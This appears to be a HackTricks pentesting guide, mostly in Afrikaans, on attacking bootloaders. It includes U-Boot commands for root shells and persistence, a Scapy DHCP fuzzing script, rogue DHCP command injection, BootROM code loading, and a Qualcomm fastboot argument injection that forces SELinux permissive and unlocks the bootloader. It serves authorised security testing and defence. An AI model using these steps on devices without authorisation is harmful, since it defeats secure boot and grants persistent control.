# Bootloader Toetsing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel om toestel-opstartkonfigurasies aan te pas en bootloaders soos U-Boot en UEFI-klas loaders te toets. Fokus op om vroeë kode-uitvoering te kry, die handtekening/rollback-beskerming te beoordeel, en recovery- of netwerk-boot-paaie te misbruik.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Kry toegang tot die interpreter-shell
- Tydens opstart, druk 'n bekende onderbreek-sleutel (dikwels enige sleutel, 0, space, of 'n board-spesifieke "magic" volgorde) voordat `bootcmd` uitgevoer word om by die U-Boot prompt uit te kom.

2. Inspekteer opstarttoestand en veranderlikes
- Nuttige opdragte:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Wysig boot-argumente om 'n root shell te kry
- Voeg `init=/bin/sh` by sodat die kernel na 'n shell val in plaas van normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot vanaf jou TFTP-bediener
- Konfigureer netwerk en haal 'n kernel/fit image vanaf die LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Maak veranderinge volhoubaar via environment
- As env-stoor nie write-protected is nie, kan jy beheer volhoubaar maak:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Kyk vir veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat fallback-paaie beïnvloed. Misgekonfigureerde waardes kan herhaalde breuke na die shell moontlik maak.

6. Kontroleer debug/onveilige funksies
- Kyk na: `bootdelay` > 0, `autoboot` gedeaktiveer, onbeperkte `usb start; fatload usb 0:1 ...`, vermoë om `loady`/`loads` via serial te gebruik, `env import` vanaf onbetroubare media, en kernels/ramdisks wat sonder signature checks gelaai word.

7. U-Boot image/verification testing
- As die platform secure/verified boot met FIT images beweer, probeer beide unsigned en gemanipuleerde images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Die afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of die legacy `verify=n`-gedrag laat dikwels toe om arbitrêre payloads te boot.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot se legacy BOOTP/DHCP hantering het geheue-veiligheidsprobleme gehad. Byvoorbeeld, CVE‑2024‑42040 beskryf memory disclosure via gekreëerde DHCP-antwoorde wat bytes uit U-Boot memory terug op die draad kan leak. Oefen die DHCP/PXE-kodepaaie met te lang/edge-case waardes (option 67 bootfile-name, vendor options, file/servername fields) en kyk vir hange/leaks.
- Minimal Scapy snippet om boot-parameteres tydens netboot te stres:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valideer ook of PXE filename-velde deurgegee word aan shell/loader-logika sonder sanitization wanneer dit aan OS-side provisioning-skripte gekoppel word.

9. Kwaadaardige DHCP-bediener command injection toetsing
- Stel 'n rogue DHCP/PXE diens op en probeer karakters in lêernaam- of opsie-velde inspuit om by command interpreters in later stadiums van die boot-ketting uit te kom. Metasploit se DHCP auxiliary, `dnsmasq`, of pasgemaakte Scapy-skripte werk goed. Maak eers seker jy isoleer die lab-netwerk.

## SoC ROM recovery modes that override normal boot

Baie SoCs gee 'n BootROM "loader" modus bloot wat kode oor USB/UART sal aanvaar selfs wanneer flash images ongeldig is. As secure-boot fuses nie gebrand is nie, kan dit arbitrêre kode-uitvoering baie vroeg in die ketting verskaf.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Evalueer of die toestel secure-boot eFuses/OTP gebrand het. Indien nie, omstandighede soos BootROM download modes omseil dikwels enige hoërvlak verifikasie (U-Boot, kernel, rootfs) deur jou eerste-stadium payload direk vanaf SRAM/DRAM uit te voer.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount die EFI System Partition (ESP) en kontroleer vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Probeer boot met gedowngrade of bekende kwesbare signed boot-komponente as Secure Boot revocations (dbx) nie op datum is nie. As die platform steeds ou shims/bootmanagers vertrou, kan jy gewoonlik jou eie kernel of `grub.cfg` vanaf die ESP laai om persistentie te kry.

11. Boot logo parsing bugs (LogoFAIL class)
- Verskeie OEM/IBV firmwares was kwesbaar vir image-parsing foute in DXE wat boot logo's verwerk. As 'n aanvaller 'n gekreëerde beeld op die ESP onder 'n vendor-spesifieke pad kan plaas (bv. `\EFI\<vendor>\logo\*.bmp`) en herbegin, kan kode-uitvoering tydens vroeë opstart moontlik wees selfs met Secure Boot aan. Toets of die platform gebruikersgelewerde logo's aanvaar en of daardie paaie vanuit die OS skryfbaar is.

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Op Android 16-toestelle wat Qualcomm se ABL gebruik om die **Generic Bootloader Library (GBL)** te laai, verifieer of ABL die UEFI-app wat dit vanaf die `efisp` partisie laai, **authentiseer**. As ABL slegs kyk vir 'n UEFI-app **presence** en nie handtekeninge verifieer nie, word 'n write primitive na `efisp` 'n **pre-OS unsigned code execution** tydens opstart.

Praktiese kontroles en misbruikpaaie:

- **efisp write primitive**: Jy het 'n manier nodig om 'n pasgemaakte UEFI-app in `efisp` te skryf (root/privileged service, OEM app bug, recovery/fastboot path). Sonder dit is die GBL-laaigaping nie direk bereikbaar nie.
- **fastboot OEM argument injection** (ABL bug): Sommige builds aanvaar ekstra tokens in `fastboot oem set-gpu-preemption` en voeg dit by die kernel cmdline. Dit kan gebruik word om permissive SELinux af te dwing, wat beskermde partisie-skrywings moontlik maak:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
As die toestel gepatch is, behoort die opdrag ekstra argumente te verwerp.
- **Bootloader unlock via persistent flags**: 'n Boot-stage payload kan persistent unlock-vlae omdraai (bv. `is_unlocked=1`, `is_unlocked_critical=1`) om `fastboot oem unlock` sonder OEM-bediener/goedkeuringshekke te emuleer. Dit is 'n volhoubare houdingverandering na die volgende herstart.

Verdedigende/triage notas:

- Bevestig of ABL signature verification op die GBL/UEFI payload vanaf `efisp` uitvoer. Indien nie, beskou `efisp` as 'n hoogs riskante persistence-oppervlak.
- Volg of ABL fastboot OEM handlers gepatch is om **argument counts** te valideer en ekstra tokens te verwerp.

## Hardware caution

Wees versigtig wanneer jy met SPI/NAND flash tydens vroeë opstart interaksie het (bv. gronding van penne om reads te omseil) en raadpleeg altyd die flash datasheet. Verkeerd getimede kortsluitings kan die toestel of die programmer korrup maak.

## Notes and additional tips

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om environment blobs tussen RAM en stoor te skuif; sommige platforms laat toe om env vanaf verwyderbare media te import sonder autentikasie.
- Vir persistentie op Linux-gebaseerde stelsels wat via `extlinux.conf` boot, is dit vaak genoeg om die `APPEND`-lyn (om `init=/bin/sh` of `rd.break` in te voeg) op die boot-partisie te wysig as daar geen signature checks afgedwing word nie.
- As userland `fw_printenv/fw_setenv` bied, verifieer dat `/etc/fw_env.config` by die werklike env-stoor pas. Misgekonfigureerde offsets laat jou toe om die verkeerde MTD-streek te lees/skryf.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
